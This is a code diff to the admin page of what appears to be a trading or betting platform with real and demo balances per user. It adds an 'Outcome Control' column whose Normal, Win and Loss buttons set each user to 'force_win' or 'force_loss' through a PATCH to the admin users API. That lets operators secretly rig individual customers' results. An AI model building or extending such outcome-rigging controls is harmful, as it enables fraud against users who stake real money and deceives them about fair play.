@@ -41,6 +41,7 @@ interface AdminUser {
   balance: number;
   demoBalance: number;
   createdAt: string;
+  manipulation: string;
 }
 
 export default function AdminPage() {
@@ -151,6 +152,7 @@ export default function AdminPage() {
       if (res.ok) {
         const data = await res.json();
         setManipulation(data.manipulation);
+        fetchUsers();
       }
     } catch (e) {
       console.error(e);
@@ -206,6 +208,24 @@ export default function AdminPage() {
         body: JSON.stringify({
           userId: user.id,
           role: nextRole,
+        }),
+      });
+      if (res.ok) {
+        fetchUsers();
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  const updateUserManipulation = async (userId: string, mode: string) => {
+    try {
+      const res = await fetch("/api/admin/users", {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userId,
+          manipulation: mode,
         }),
       });
       if (res.ok) {
@@ -558,6 +578,7 @@ export default function AdminPage() {
                           <th className="pb-3 px-2">Access Role</th>
                           <th className="pb-3 px-2 text-right">Real Balance</th>
                           <th className="pb-3 px-2 text-right">Demo Balance</th>
+                          <th className="pb-3 px-2">Outcome Control</th>
                           <th className="pb-3 px-2">Signed Up</th>
                           <th className="pb-3 pl-2 text-right">Actions</th>
                         </tr>
@@ -587,6 +608,40 @@ export default function AdminPage() {
                             </td>
                             <td className="py-3 px-2 text-right font-medium text-[#3B82F6] tabular-nums">
                               ${u.demoBalance.toFixed(2)}
+                            </td>
+                            <td className="py-3 px-2">
+                              <div className="flex items-center gap-1">
+                                <button
+                                  onClick={() => updateUserManipulation(u.id, "normal")}
+                                  className={`px-2 py-1 rounded text-[9px] font-bold uppercase transition ${
+                                    u.manipulation === "normal"
+                                      ? "bg-gray-500/25 text-gray-300 border border-gray-500/40"
+                                      : "bg-white/5 text-gray-500 border border-transparent hover:bg-white/10"
+                                  }`}
+                                >
+                                  Normal
+                                </button>
+                                <button
+                                  onClick={() => updateUserManipulation(u.id, "force_win")}
+                                  className={`px-2 py-1 rounded text-[9px] font-bold uppercase transition ${
+                                    u.manipulation === "force_win"
+                                      ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
+                                      : "bg-white/5 text-gray-500 border border-transparent hover:bg-white/10"
+                                  }`}
+                                >
+                                  Win
+                                </button>
+                                <button
+                                  onClick={() => updateUserManipulation(u.id, "force_loss")}
+                                  className={`px-2 py-1 rounded text-[9px] font-bold uppercase transition ${
+                                    u.manipulation === "force_loss"
+                                      ? "bg-rose-500/20 text-rose-400 border border-rose-500/40"
+                                      : "bg-white/5 text-gray-500 border border-transparent hover:bg-white/10"
+                                  }`}
+                                >
+                                  Loss
+                                </button>
+                              </div>
                             </td>
                             <td className="py-3 px-2 text-gray-500">
                               {new Date(u.createdAt).toLocaleDateString()}
